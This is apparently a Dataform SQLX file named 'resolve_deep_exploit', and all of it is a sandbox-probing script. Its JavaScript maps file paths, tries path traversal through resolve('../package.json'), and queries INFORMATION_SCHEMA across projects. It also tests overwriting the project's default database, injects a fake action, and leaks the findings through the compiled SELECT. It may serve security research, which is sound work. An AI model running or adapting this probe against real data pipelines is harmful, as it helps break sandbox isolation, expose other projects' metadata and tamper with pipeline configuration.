config { type: "view", name: "resolve_deep_exploit" }

js {
  let r = { t: new Date().toISOString() };

  // CWD Discovery
  try {
    r.cwd = {};
    if (typeof process !== 'undefined' && process.cwd) r.cwd.processCwd = process.cwd();
    if (typeof __dirname !== 'undefined') r.cwd.__dirname = __dirname;
    if (typeof __filename !== 'undefined') r.cwd.__filename = __filename;
    if (typeof module !== 'undefined') r.cwd.moduleFilename = module.filename;
    if (typeof dataform !== 'undefined') r.cwd.rootDir = dataform.rootDir;
  } catch(e) { r.cwd = { err: e.message }; }

  // resolve() behavior
  try {
    if (typeof resolve === 'function') {
      r.resolve = { len: resolve.length, src: resolve.toString().substring(0, 200) };
      r.resolve.simple = String(resolve('simple_test'));
      r.resolve.traverse1 = String(resolve('../package.json'));
      r.resolve.traverse3 = String(resolve('../../../package.json'));
    }
  } catch(e) { r.resolve = { err: e.message }; }

  // ref() cross-project
  try {
    r.ref = {};
    r.ref.simple = String(ref('simple_test'));
    r.ref.infoSchema = String(ref('INFORMATION_SCHEMA.TABLES'));
  } catch(e) { r.ref = { err: e.message }; }

  // require.resolve paths
  try {
    if (typeof require !== 'undefined' && require.resolve) {
      r.reqResolve = {};
      r.reqResolve.dfcore = require.resolve('@dataform/core');
      r.reqResolve.paths = require.resolve.paths?.('@dataform/core');
    }
  } catch(e) { r.reqResolve = { err: e.message }; }

  // Config modification
  try {
    r.configMod = { frozen: Object.isFrozen(dataform?.projectConfig) };
    if (dataform?.projectConfig) {
      const orig = dataform.projectConfig.defaultDatabase;
      dataform.projectConfig.defaultDatabase = "TEST";
      r.configMod.modified = dataform.projectConfig.defaultDatabase === "TEST";
      dataform.projectConfig.defaultDatabase = orig;
    }
  } catch(e) { r.configMod = { err: e.message }; }

  // Actions push
  try {
    if (dataform?.actions) {
      const len = dataform.actions.length;
      dataform.actions.push({ name: 'INJECTED' });
      r.actionPush = { pushed: dataform.actions.length > len };
    }
  } catch(e) { r.actionPush = { err: e.message }; }
}

SELECT '${JSON.stringify(r)}' as r
